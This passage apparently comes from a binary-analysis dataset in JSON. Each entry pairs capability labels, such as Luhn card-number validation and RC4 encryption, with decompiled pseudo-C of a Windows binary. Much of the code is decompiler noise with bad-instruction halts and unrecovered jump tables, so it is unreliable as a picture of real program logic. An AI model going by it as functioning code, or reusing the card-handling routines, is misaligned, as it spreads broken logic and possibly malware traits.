   puStack104 = unaff_RDI + 1;\n                uVar2 = in(uVar18);\n                *unaff_RDI = uVar2;\n                puVar1 = puVar29 + 0x6f;\n                *puVar1 = *puVar1 & 0xa9;\n                if (*puVar1 == 0) {\n                    puVar15 = arg3 + 0x61;\n                    uVar10 = puVar13 >> 8;\n                    bVar30 = CARRY1(*puVar15, uVar10);\n                    *puVar15 = *puVar15 + uVar10;\n                    uVar10 = *puVar15;\n                    goto code_r0x00014010ad0f;\n                }\n                puVar15 = puVar29;\n                if (*puVar1 != 0) goto code_r0x00014010acee;\ncode_r0x00014010ad4f:\n                *puVar13 = *puVar13 + uVar10;\n                *puVar13 = *puVar13 + puVar13;\n                *puVar13 = *puVar13 + puVar13;\n                goto code_r0x00014010ad55;\n            }\n            puVar1 = arg3 + 0x61;\n            uVar8 = *puVar1;\n            uVar16 = puVar13 >> 8;\n            bVar30 = SCARRY1(*puVar1, uVar16);\n            *puVar1 = *puVar1 + uVar16;\n            bVar32 = *puVar1 == 0;\n            if (CARRY1(uVar8, uVar16)) {\n                if (!bVar32) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                if ((bVar32) || (*(puVar15 + 0x68) * 0x73613a3a == *(puVar15 + 0x68) * 0x73613a3a)) {\ncode_r0x00014010ad04:\n                    puVar15 = puVar29;\n                    uVar8 = *(unaff_RDI + 0x73) >> 8;\n                    if (bVar32) {\n                        cVar9 = puVar13;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + 0x20;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + 0x20;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *arg3 = *arg3 + ' ';\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *arg3 = *arg3 + ' ';\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *puVar13 = *puVar13 + cVar9;\n                        *(puVar13 * 2) = *(puVar13 * 2) + ' ';\n                        goto code_r0x00014010adb2;\n                    }\n                    goto code_r0x00014010ad17;\n                }\n                puVar15 = puVar29 & 0xffffffff00000000 | ZEXT48(puVar29 + 1);\n                out(*puVar29, uVar18);\n                puVar29 = arg3 + 0x61;\n                uVar8 = *puVar29;\n                *puVar29 = *puVar29 + uVar16;\n                if (CARRY1(uVar8, uVar16)) {\n                    arg1 = *(unaff_RDI + 0x73);\n                    uVar8 = arg1 >> 8;\n                    if (*puVar29 != 0) {\n                        bVar31 = *(puVar15 + 0x67) * 0x70613a3a != *(puVar15 + 0x67) * 0x70613a3a;\n                        bVar32 = bVar31;\n                        goto code_r0x00014010acae;\n                    }\n                    goto code_r0x00014010ad17;\n                }\n                puVar15 = iVar19 + 0x61;\n                bVar30 = CARRY1(*puVar15, uVar16);\n                *puVar15 = *puVar15 + uVar16;\n                uVar10 = *puVar15;\ncode_r0x00014010ad0f:\n                if (bVar30) {\n                    if (uVar10 != 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                goto code_r0x00014010ad7a;\n            }\njoined_r0x00014010ac83:\n            if (!bVar30) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            puVar15 = arg3 + 0x61;\n            uVar10 = *puVar15;\n            uVar8 = puVar13 >> 8;\n            *puVar15 = *puVar15 + uVar8;\n            bVar32 = *puVar15 == 0;\n            if (CARRY1(uVar10, uVar8)) {\n                if ((!bVar32) && (*(puVar29 + 0x67) * 0x61623a3a != *(puVar29 + 0x67) * 0x61623a3a))\n                goto code_r0x00014010ad04;\n                goto code_r0x00014010ad6d;\n            }\n        }\n        else {\n            if (0x6968741f < uVar11) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if ((POPCOUNT(uVar11 + 0x96978be0 & 0xff) & 1U) == 0) {\n                puVar29 = arg3 + in_GS_OFFSET + 0x61;\n                uVar17 = puVar13 >> 8;\n                bVar31 = CARRY1(*puVar29, uVar17);\n                uVar16 = *puVar29;\n                *puVar29 = *puVar29 + uVar17;\n                bVar30 = *puVar29 == 0;\n                uVar8 = *puVar29;\n                bVar32 = SCARRY1(uVar16, uVar17);\n                if (bVar31) {\n                    arg1 = *(unaff_RDI + 0x73);\n                    goto code_r0x00014010ac48;\n                }\ncode_r0x00014010acae:\n                uVar8 = arg1 >> 8;\n                if (bVar32) {\n                    if (bVar31) {\n                        return;\n                    }\ncode_r0x00014010ad17:\n                    out(*puVar15, uVar18);\n                    if (uVar8 < *iVar19) {\n                        return;\n                    }\n                    uVar10 = puVar13;\n                    *puVar13 = *puVar13 + uVar10;\n                    *puVar13 = *puVar13 + uVar10;\n                    *puVar13 = *puVar13 + uVar10;\n                    *puVar13 = *puVar13 | uVar10;\n                    *puVar13 = *puVar13 + uVar10;\n                    *puVar13 = *puVar13 + uVar10;\n                    *puVar13 = *puVar13 + uVar10;\n                    uVar10 = uVar10 | *puVar13;\n                    puVar15 = puVar13 & 0xffffffffffffff00 | uVar10;\n                    *puVar15 = *puVar15 + uVar10;\n                    *puVar15 = *puVar15 + uVar10;\n                    *puVar15 = *puVar15 + uVar10;\n                    uVar10 = uVar10 | *puVar15;\n                    puVar13 = puVar13 & 0xffffffffffffff00 | uVar10;\n                    *puVar13 = *puVar13 + uVar10;\n                    *puVar13 = *puVar13 + uVar10;\n                    *puVar13 = *puVar13 + uVar10;\ncode_r0x00014010adb2:\n                    cVar9 = puVar13;\n                    *puVar13 = *puVar13 + cVar9;\n                    *puVar13 = *puVar13 + cVar9;\n                    *puVar13 = *puVar13 + cVar9;\n                    *puVar13 = *puVar13 + cVar9;\n                    *puVar13 = *puVar13 + cVar9;\n                    *puVar13 = *puVar13 + cVar9;\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                puVar29 = puVar15 + 1;\n                out(*puVar15, uVar18);\n                puVar15 = arg3 + in_FS_OFFSET + 0x61;\n                uVar8 = *puVar15;\n                uVar16 = puVar13 >> 8;\n                *puVar15 = *puVar15 + uVar16;\n                bVar32 = (POPCOUNT(*puVar15) & 1U) == 0;\n                if (CARRY1(uVar8, uVar16)) {\n                    if (*puVar15 == 0) goto code_r0x00014010ad2e;\n                    goto code_r0x00014010acbc;\n                }\n                *puVar13 = *puVar13 + puVar13;\n                *puVar13 = *puVar13 + puVar13;\ncode_r0x00014010ad26:\n                *puVar13 = *puVar13 + puVar13;\ncode_r0x00014010ad28:\n                *puVar13 = *puVar13 + puVar13;\n                *puVar13 = *puVar13 + puVar13;\ncode_r0x00014010ad2c:\n                *puVar13 = *puVar13 + puVar13;\ncode_r0x00014010ad2e:\n                *puVar13 = *puVar13 + puVar13;\n                *(ppcVar22 + -8) = puVar13;\n                *(ppcVar22 + -0x10) = in_R11;\ncode_r0x00014010ad35:\n                cVar9 = puVar13;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\ncode_r0x00014010ad43:\n                cVar9 = puVar13;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                *0x14010a920 = *0x14010a920 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                goto code_r0x00014010ad4f;\n            }\n            *0x14010a920 = *0x14010a920 + 'W';\n            puVar29 = puVar15;\ncode_r0x00014010abdc:\n            *puVar13 = *puVar13 & 0xa9;\n            bVar30 = *puVar13 == 0;\n            uVar8 = *puVar13;\n            puVar15 = puVar29;\n            if (bVar30) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\ncode_r0x00014010ac48:\n            bVar32 = (POPCOUNT(uVar8) & 1U) == 0;\n            puVar29 = puVar15;\n            if (!bVar30) {\n                bVar30 = *(puVar15 + 0x67) * 0x4d5f3a3a != *(puVar15 + 0x67) * 0x4d5f3a3a;\n                ppcVar24 = ppcVar22 + 1;\n                ppcVar25 = ppcVar22 + 1;\n                ppcVar26 = ppcVar22 + 1;\n                if (bVar30) {\n                    if (bVar30) {\n                        ppcVar22 = ppcVar22 + 1;\n                        if (bVar30) goto code_r0x00014010ad26;\n                        puVar29 = puVar15 + 1;\n                        out(*puVar15, uVar18);\n                        uVar8 = arg1 >> 8;\n                        bVar30 = uVar8 < *iVar19;\n                        bVar32 = (POPCOUNT(uVar8 - *iVar19) & 1U) == 0;\n                        ppcVar22 = ppcVar25;\n                        ppcVar27 = ppcVar24;\n                        if (bVar30) goto code_r0x00014010ad28;\n                        goto code_r0x00014010acc3;\n                    }\n                    puVar13[0x4f] = puVar13[0x4f] + uVar10;\n                    *ppcVar22 = arg1;\n                }\n                else {\n                    if (!bVar30) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    ppcVar22 = ppcVar22 + 1;\n                    ppcVar27 = ppcVar26;\n                    if (bVar30) goto code_r0x00014010acc5;\n                }\n                goto code_r0x00014010ad2e;\n            }\ncode_r0x00014010acbc:\n            bVar30 = *(puVar29 + 0x67) * 0x65723a3a != *(puVar29 + 0x67) * 0x65723a3a;\n            ppcVar27 = ppcVar22;\ncode_r0x00014010acc3:\n            ppcVar22 = ppcVar27;\n            ppcVar27 = ppcVar22;\n            if (!bVar30) goto code_r0x00014010ad2e;\ncode_r0x00014010acc5:\n            ppcVar22 = ppcVar27;\n            if (bVar32) goto code_r0x00014010ad2c;\n            puVar15 = arg3 + 0x61;\n            uVar8 = *puVar15;\n            uVar16 = puVar13 >> 8;\n            *puVar15 = *puVar15 + uVar16;\n            if (!CARRY1(uVar8, uVar16)) goto code_r0x00014010ad35;\n            if (*puVar15 == 0) goto code_r0x00014010ad43;\n            iVar6 = *(puVar29 + 0x67) * 0x535f3a3a;\n            bVar30 = iVar6 == iVar6;\n            unaff_RDI = *ppcVar27;\n            if (bVar30) {\ncode_r0x00014010ad52:\n                uVar8 = puVar13;\n                *puVar13 = *puVar13 + uVar8;\n                *puVar13 = *puVar13 + uVar8;\n                uVar10 = *puVar13;\n                *puVar13 = *puVar13 + uVar8;\n                *puVar13 = *puVar13 + uVar8 + CARRY1(uVar10, uVar8);\n                *puVar13 = *puVar13 + uVar8;\n                *puVar13 = *puVar13 + uVar8;\n                *puVar13 = *puVar13 + uVar8;\n                uVar8 = uVar8 + *puVar13;\n                pcVar14 = puVar13 & 0xffffffffffffff00 | uVar8;\n                *pcVar14 = *pcVar14 + uVar8;\n                *pcVar14 = *pcVar14 + uVar8;\n                *pcVar14 = *pcVar14 + uVar8;\n                uVar8 = uVar8 + *pcVar14;\n                puVar13 = puVar13 & 0xffffffffffffff00 | uVar8;\n                *puVar13 = *puVar13 + uVar8;\n                *puVar13 = *puVar13 + uVar8;\n                goto code_r0x00014010ad6e;\n            }\n            if (bVar30) {\n                puVar29 = *(puVar13 + 0x6e);\n                if (*puVar15 == 0) goto code_r0x00014010ace6;\n                goto code_r0x00014010ad52;\n            }\ncode_r0x00014010ad55:\n            cVar9 = puVar13;\n            *puVar13 = *puVar13 + cVar9;\n            *puVar13 = *puVar13 + uVar10;\n            *puVar13 = *puVar13 + cVar9;\n            *puVar13 = *puVar13 + cVar9;\n            *puVar13 = *puVar13 + cVar9;\n        }\n        cVar9 = puVar13;\n        *arg3 = *arg3 + cVar9;\n        *puVar13 = *puVar13 + cVar9;\n        *puVar13 = *puVar13 + cVar9;\ncode_r0x00014010ad65:\n        cVar9 = puVar13;\n        *puVar13 = *puVar13 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *puVar13 = *puVar13 + cVar9;\n        *puVar13 = *puVar13 + cVar9;\n    }\ncode_r0x00014010ad6d:\n    cVar9 = puVar13;\n    *puVar13 = *puVar13 + cVar9;\n    *(puVar13 * 2) = *(puVar13 * 2) + cVar9;\n    *puVar13 = *puVar13 + cVar9;\n    *puVar13 = *puVar13 + cVar9;\n    *puVar13 = *puVar13 + cVar9;\ncode_r0x00014010ad7a:\n    cVar9 = puVar13;\n    *puVar13 = *puVar13 + cVar9;\n    *puVar13 = *puVar13 + cVar9;\n    *puVar13 = *puVar13 + cVar9;\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 14007
    },
    "140083cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00014003adb8) overlaps instruction at (ram,0x00014003adb1)\n// \n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.140083cb0(int64_t **arg1, ulong noname_1, int64_t *arg3)\n\n{\n    int64_t **arg2;\n    uint uVar1;\n    code *pcVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uint uVar30;\n    uint uVar31;\n    uint32_t **ppuVar32;\n    uint32_t **ppuVar33;\n    uint32_t **ppuVar34;\n    uint32_t **ppuVar35;\n    uint32_t **ppuVar36;\n    uint32_t **ppuVar37;\n    uint32_t **ppuVar38;\n    char cVar39;\n    uint8_t uVar40;\n    uint8_t uVar41;\n    uint8_t uVar42;\n    ushort uVar43;\n    uint16_t uVar44;\n    int16_t iVar45;\n    int16_t iVar46;\n    uint16_t uVar47;\n    int32_t iVar48;\n    uint32_t uVar49;\n    uint32_t uVar50;\n    uint32_t uVar51;\n    uint16_t *puVar52;\n    char *pcVar53;\n    int16_t *piVar54;\n    uint64_t uVar55;\n    ulong uVar56;\n    ushort *puVar57;\n    int64_t iVar58;\n    int64_t **ppiVar59;\n    int32_t *piVar60;\n    int32_t *piVar61;\n    char *pcVar62;\n    uchar *puVar63;\n    uint8_t uVar64;\n    uint32_t uVar65;\n    uint8_t uVar72;\n    char cVar73;\n    int16_t *piVar66;\n    uint64_t uVar67;\n    int64_t *piVar68;\n    int64_t *piVar69;\n    uchar *puVar70;\n    int64_t **unaff_RBX;\n    uint32_t **ppuVar74;\n    uint32_t **ppuVar75;\n    uint32_t **ppuVar76;\n    uint32_t **ppuVar77;\n    uint32_t **ppuVar78;\n    bool bVar79;\n    uint8_t uVar80;\n    int64_t *piVar81;\n    int64_t *unaff_RBP;\n    bool bVar82;\n    int32_t iVar83;\n    int64_t **unaff_RSI;\n    uint8_t *puVar84;\n    int64_t **unaff_RDI;\n    int64_t iVar85;\n    int64_t **ppiVar86;\n    int64_t **in_R9;\n    int64_t **unaff_R12;\n    int64_t **unaff_R13;\n    uint32_t *puVar87;\n    int64_t **unaff_R14;\n    int64_t *piVar88;\n    int64_t *unaff_R15;\n    ushort in_FS;\n    bool bVar89;\n    uchar auVar90 [16];\n    uint in_XMM1_Da;\n    uint in_XMM1_Db;\n    uint in_XMM1_Dc;\n    uint in_XMM1_Dd;\n    uint in_XMM3_Da;\n    uint in_XMM3_Db;\n    uint in_XMM3_Dc;\n    uint in_XMM3_Dd;\n    uint in_XMM4_Da;\n    uint in_XMM4_Db;\n    uint in_XMM4_Dc;\n    uint in_XMM4_Dd;\n    uint in_XMM5_Da;\n    uint in_XMM5_Db;\n    uint in_XMM5_Dc;\n    uint in_XMM5_Dd;\n    uint in_XMM6_Da;\n    uint in_XMM6_Db;\n    uint in_XMM6_Dc;\n    uint in_XMM6_Dd;\n    ushort *in_stack_00000000;\n    uint8_t auStackX8 [8];\n    uint *puStackX16;\n    ulong *puStackX32;\n    uchar (*in_stack_00000028) [16];\n    uchar *in_stack_00000030;\n    int16_t in_stack_00000038;\n    unkbyte6 in_stack_0000003a;\n    uchar uStack0000000000000040;\n    unkbyte5 Stack0000000000000040;\n    uint8_t uStack0000000000000045;\n    char cStack0000000000000046;\n    uint32_t uStack0000000000000044;\n    int64_t **in_stack_00000040;\n    uint32_t in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000054;\n    ushort *in_stack_00000058;\n    int64_t *in_stack_00000060;\n    ushort in_stack_00000068;\n    unkbyte6 in_stack_0000006a;\n    int64_t *in_stack_00000078;\n    uint64_t in_stack_00000080;\n    uchar in_stack_00000088;\n    unkbyte7 in_stack_00000089;\n    int64_t **in_stack_000000c8;\n    int64_t **in_stack_000000e8;\n    uint32_t *in_stack_00000110;\n    ulong in_stack_00000118;\n    uint32_t in_stack_00000230;\n    uint32_t *puStack104;\n    uchar auStack96 [24];\n    int64_t *piStack56;\n    ushort uStack48;\n    int16_t iStack46;\n    int32_t iStack44;\n    uchar UNRECOVERED_JUMPTABLE [16];\n    int64_t *piStack24;\n    int64_t *piStack16;\n    uint8_t *puVar71;\n    \n    ppuVar78 = &puStack104;\n    ppuVar76 = &puStack104;\n    ppuVar74 = &puStack104;\n    ppuVar77 = &puStack104;\n    piVar88 = *in_R9;\n    piVar81 = in_R9[1];\n    ppiVar59 = CONCAT62(in_stack_0000003a, in_stack_00000038);\n    auVar90 = *in_stack_00000028;\n    uVar56 = SUB168(auVar90, 0);\n    puVar63 = 0x14010b248;\n    uVar49 = (in_stack_00000048 & 0xff) - 100 & 0xff;\n    piStack24 = piVar88;\n    piStack16 = piVar81;\n    iVar58 = *(uVar49 * 4 + 0x14010b248);\n    UNRECOVERED_JUMPTABLE = auVar90;\n    UNRECOVERED_JUMPTABLE._0_8_ = iVar58 + 0x14010b248;\n    bVar89 = UNRECOVERED_JUMPTABLE._0_8_ == NULL;\n    uVar40 = UNRECOVERED_JUMPTABLE._0_8_;\n    uVar41 = UNRECOVERED_JUMPTABLE._0_8_ >> 8;\n    uVar50 = UNRECOVERED_JUMPTABLE._0_8_;\n    uVar42 = arg3 >> 8;\n    uVar64 = arg1;\n    uVar80 = arg1 >> 8;\n    ppuVar32 = &puStack104;\n    ppuVar33 = &puStack104;\n    ppuVar34 = &puStack104;\n    ppuVar35 = &puStack104;\n    ppuVar36 = &puStack104;\n    ppuVar75 = &puStack104;\n    ppuVar37 = &puStack104;\n    ppuVar38 = &puStack104;\n    switch(uVar49) {\n    case 0:\n        (**(*arg3 + 0x20))(uVar56, arg1, arg3, &piStack24, UNRECOVERED_JUMPTABLE);\n        return arg1;\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 10:\n    case 0xb:\n    case 0xc:\n    case 0xd:\n    case 0xe:\n    case 0xf:\n    case 0x11:\n    case 0x12:\n    case 0x14:\n    case 0x15:\n        (**(*arg3 + 0x38))(uVar56, arg1, arg3, &piStack24, UNRECOVERED_JUMPTABLE);\n        return arg1;\n    case 9:\n        (**(*arg3 + 0x30))(uVar56, arg1, arg3, &piStack24, UNRECOVERED_JUMPTABLE);\n        return arg1;\n    case 0x10:\n        (**(*arg3 + 0x18))(uVar56, arg1, arg3, &piStack24, UNRECOVERED_JUMPTABLE);\n        return arg1;\n    case 0x13:\n        (**(*arg3 + 0x28))(uVar56, arg1, arg3, &piStack24, UNRECOVERED_JUMPTABLE);\n        return arg1;\n    case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x18:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x21:\n    case 0x34:\n    case 0xc9:\n    case 0xfd:\n        *(puStack104 + -0x77000875) = *(puStack104 + -0x77000875) + -1;\n        *(puStack104 + -0x77000875) = *(puStack104 + -0x77000875) + -1;\n        *(puStack104 + -0x77000875) = *(puStack104 + -0x77000875) + -1;\n        *(puStack104 + -0x77000875) = *(puStack104 + -0x77000875) + -1;\n    // WARNING: Could not recover jumptable at 0x00014010b26b. Too many branches\n    // WARNING: Treating indirect jump as call\n        ppiVar59 = (**puStack104)(uVar56);\n        return ppiVar59;\n    case 0x22:\n    case 0x3f:\n    case 0xba:\n    case 0xca:\n    case 0xd8:\n    case 0xe6:\n    case 0xf2:\n    case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x23:\n    case 0x40:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x24:\n    case 0x41:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x25:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x26:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x27:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x28:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x29:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2b:\n    case 0x48:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x30:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x31:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x32:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x33:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x35:\n        *(arg3 + 4) = *(arg3 + 4) + uVar80;\n        fcn.1400a9080(0x14010b248, arg3);\n        in_stack_00000078 = &stack0x00000088;\n        puStackX32 = &stack0x00000078;\n        in_stack_00000080 = 0;\n        in_stack_00000088 = 0;\n        piStack24 = in_stack_00000078;\n        fcn.1400a9080(puStackX32, 0x20);\n        uStack0000000000000044 = uStack0000000000000044 & 0xffff00ff;\n        iStack44 = 0;\n        UNRECOVERED_JUMPTABLE =\n             CONCAT88(SUB168(UNRECOVERED_JUMPTABLE >> 0x40, 0), piStack56 + 0x66) & 0xffffffffffffffff;\n        in_stack_00000054 = *(piStack56 + 0xc);\n        puStackX16 = &stack0x00000054;\n        unaff_RBX = NULL;\n        in_stack_00000040 = (uStack0000000000000044 & 0xff00ffff) << 0x20;\n        do {\n            if (*(puStackX16 + UNRECOVERED_JUMPTABLE._8_8_) < 5) {\n    // WARNING: Could not recover jumptable at 0x000140041672. Too many branches\n    // WARNING: Treating indirect jump as call\n                ppiVar59 = (*(*(*(puStackX16 + UNRECOVERED_JUMPTABLE._8_8_) * 4 + 0x14010b31c) + 0x14010b31c))();\n                return ppiVar59;\n            }\n            uVar40 = 1;\ncode_r0x00014004194d:\n            uVar44 = unaff_RDI;\n            auVar90 = UNRECOVERED_JUMPTABLE >> 0x40;\n            UNRECOVERED_JUMPTABLE = CONCAT88(UNRECOVERED_JUMPTABLE._8_8_ + 1, UNRECOVERED_JUMPTABLE._0_8_);\n        } while ((SUB164(auVar90, 0) + 1 < 4 & uVar40) != 0);\n        if ((0x1 < unaff_RBX & uVar40) == 0) {\n            if (uVar40 == 0) {\ncode_r0x000140041bf5:\n                bVar89 = uVar44 == 0xffff;\n                goto code_r0x000140041bfd;\n            }\njoined_r0x000140042393:\n            if ((1 < in_stack_00000080) && (uVar55 = fcn.14002f7b0(puStackX32, 0x30, 0),  uVar55 != 0)) {\n                if (uVar55 == 0xffffffffffffffff) {\n                    uVar55 = in_stack_00000080 - 1;\n                    if (in_stack_00000080 == 0) {\n                        *in_stack_00000078 = '\\0';\n                    }\n                    else if (uVar55 != 0) goto code_r0x000140042260;\n                }\n                else {\ncode_r0x000140042260:\n                    uVar67 = in_stack_00000080;\n                    if (uVar55 <= in_stack_00000080) {\n                        uVar67 = uVar55;\n                    }\n                    fcn.1400a9130(puStackX32, 0, uVar67);\n                }\n            }\n            if ((cStack0000000000000046 != '\\0') && (*in_stack_00000078 != '0')) {\n                fcn.1400a76a0(puStackX32, 0, 0, 1);\n            }\n            piVar88 = in_stack_00000060;\n            if (in_stack_00000060 != NULL) {\n                piVar81 = in_stack_00000060 + 1;\n                if (uStack0000000000000045 == '\\0') {\n                    uStack0000000000000040 = iStack44;\n                }\n                if (in_stack_00000058 == in_stack_00000000) {\n                    piVar68 = 0xf;\n                }\n                else {\n                    piVar68 = CONCAT62(in_stack_0000006a, in_stack_00000068);\n                }\n                if (piVar68 < piVar81) {\n                    fcn.1400a9390(in_stack_00000028, in_stack_00000060, 0, 0);\n                }\n                *(in_stack_00000058 + piVar88) = uStack0000000000000040;\n                *(in_stack_00000058 + 1 + piVar88) = 0;\n                in_stack_00000060 = piVar81;\n                cVar39 = fcn.1400b7670(piStack56[2], piStack56[3], in_stack_00000028);\n                if (cVar39 == '\\0') {\n                    *in_stack_00000110 = *in_stack_00000110 | 4;\n                }\n            }\n            bVar89 = uVar44 == 0xffff;\n            if ((uStack0000000000000045 != '\\0') && (*(piStack56 + 0xb) != iStack44)) goto code_r0x000140041bfd;\n            fcn.1400a78c0(in_stack_00000118, puStackX32);\n            bVar79 = arg1 != NULL && bVar89;\n            if (arg1 == NULL || !bVar89) goto code_r0x000140041c18;\n        }\n        else {\n            if (cStack0000000000000046 == '\\0') {\n                unaff_R15 = piStack56[7];\n            }\n            else {\n                unaff_R15 = piStack56[9];\n            }\n            unaff_R14 = 0x1;\n            while( true ) {\n                uVar44 = unaff_RDI;\n                bVar89 = uVar44 == 0xffff;\n                bVar82 = arg1 != NULL && bVar89;\n                bVar79 = bVar89;\n                if (bVar82) {\n                    if (arg1[2] < arg1[3]) {\n                        iVar45 = *arg1[2];\n                    }\n                    else {\n                        iVar45 = (*(*arg1)[9])(arg1);\n                    }\n                    if (iVar45 == -1) {\n                        arg1 = NULL;\n                    }\n                    bVar79 = iVar45 == -1 && bVar82;\n                }\n                bVar82 = unaff_RBP != NULL && iStack46 == -1;\n                if (bVar82) break;\n                if ((iStack46 == -1) == bVar79) goto code_r0x000140041f98;\ncode_r0x0001400416fd:\n                if (unaff_RBX <= unaff_R14) goto code_r0x000140041f98;\n                uVar47 = uVar44;\n                if ((arg1 != NULL) && (bVar89)) {\n                    if (arg1[2] < arg1[3]) {\n                        uVar47 = *arg1[2];\n                    }\n                    else {\n                        uVar47 = (*(*arg1)[9])(arg1);\n                    }\n                    if (uVar47 == 0xffff) {\n                        arg1 = NULL;\n                    }\n                }\n                if (*(unaff_R15 + unaff_R14 * 2) != uVar47) goto code_r0x000140041bfd;\ncode_r0x000140041726:\n                if (arg1[2] < arg1[3]) {\n                    arg1[2] = arg1[2] + 2;\n                }\n                else {\n                    (*(*arg1)[10])(arg1);\n                }\n                unaff_R14 = unaff_R14 + 1;\n                unaff_RDI = 0xffffffff;\n            }\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar45 = *unaff_RBP[2];\n            }\n            else {\n                iVar45 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            if (iVar45 == -1) {\n                unaff_RBP = NULL;\n            }\n            if ((iVar45 == -1 && bVar82) != bVar79) goto code_r0x0001400416fd;\ncode_r0x000140041f98:\n            if (unaff_R14 == unaff_RBX) goto joined_r0x000140042393;\ncode_r0x000140041bfd:\n            *in_stack_00000110 = *in_stack_00000110 | 4;\n            bVar79 = arg1 != NULL & bVar89;\n            if (bVar79 == false) goto code_r0x000140041c18;\n        }\n        if (arg1[2] < arg1[3]) {\n            iVar45 = *arg1[2];\n        }\n        else {\n            iVar45 = 